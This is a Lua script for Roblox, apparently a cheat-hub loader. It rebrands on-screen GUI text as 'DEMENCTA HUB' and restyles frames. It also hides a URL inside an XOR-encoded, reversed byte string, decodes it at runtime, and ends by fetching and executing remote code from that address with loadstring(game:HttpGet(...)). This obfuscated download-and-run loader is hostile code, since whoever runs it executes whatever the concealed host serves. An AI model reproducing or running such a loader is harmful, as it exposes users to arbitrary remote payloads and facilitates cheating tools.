
--[[ STAGE 2: VISUAL CORE ]]
local kKxHzlUidWddB0C="\238\196\253\129\141\142\254\253\150\192\198\196\196\204\204\221\034\222\196\210\229\229\238\233\243\053\032\037\058\207\040\048\000\059\006\035\052\196\056\014\003\005\010\021\010\015\060\010\000\005\016\102\103\028\107\096\097\113\118\016\100\108\124\108\114\123\118\101\116\078\126\105\012\077\074\068\082\022\085\087\078\166\092\086\094\169\091\106\161\178\175\164\178\172\182\172\187\190\191\066\130\134\188\073\145\141\134\151\147\150\140\157\146\226\230\149\234\159\237\228\228\173\248\228\247\182\184\133\192\255\197\199\253"local OROyYcez4xKEoOVAR9Cx=160 local bZ6EH5CJYNI6_kyvvYZ=205 local Ak3QPCxLrXUdRawA=1 local JoE_ZtXuLPFRE=2 local P_fEJNIIeVg9yULvpvB=30 local OaT9zH6dcuBID021hzN=true local i57o671PLllk36t5B=bit32 and bit32.bxor if not i57o671PLllk36t5B then i57o671PLllk36t5B=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vRZasbTkzl0jHGvm_4S={}for DOkrkKSLZXcmbv=1,#kKxHzlUidWddB0C do local BOcemi5CTlMA=string.byte(kKxHzlUidWddB0C,DOkrkKSLZXcmbv)local zSdDTKloDxbPmp5=(bZ6EH5CJYNI6_kyvvYZ+(DOkrkKSLZXcmbv*JoE_ZtXuLPFRE)+P_fEJNIIeVg9yULvpvB)%256 if Ak3QPCxLrXUdRawA==0 then BOcemi5CTlMA=(BOcemi5CTlMA-zSdDTKloDxbPmp5)%256 vRZasbTkzl0jHGvm_4S[DOkrkKSLZXcmbv]=string.char(i57o671PLllk36t5B(BOcemi5CTlMA,OROyYcez4xKEoOVAR9Cx))else BOcemi5CTlMA=i57o671PLllk36t5B(BOcemi5CTlMA,OROyYcez4xKEoOVAR9Cx)vRZasbTkzl0jHGvm_4S[DOkrkKSLZXcmbv]=string.char((BOcemi5CTlMA-zSdDTKloDxbPmp5)%256)end end local NU6ZidO8nf0K99Zt=table.concat(vRZasbTkzl0jHGvm_4S)if OaT9zH6dcuBID021hzN then NU6ZidO8nf0K99Zt=string.reverse(NU6ZidO8nf0K99Zt)end local F4s5OktUYVwT__u6=NU6ZidO8nf0K99Zt
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(F4s5OktUYVwT__u6))()
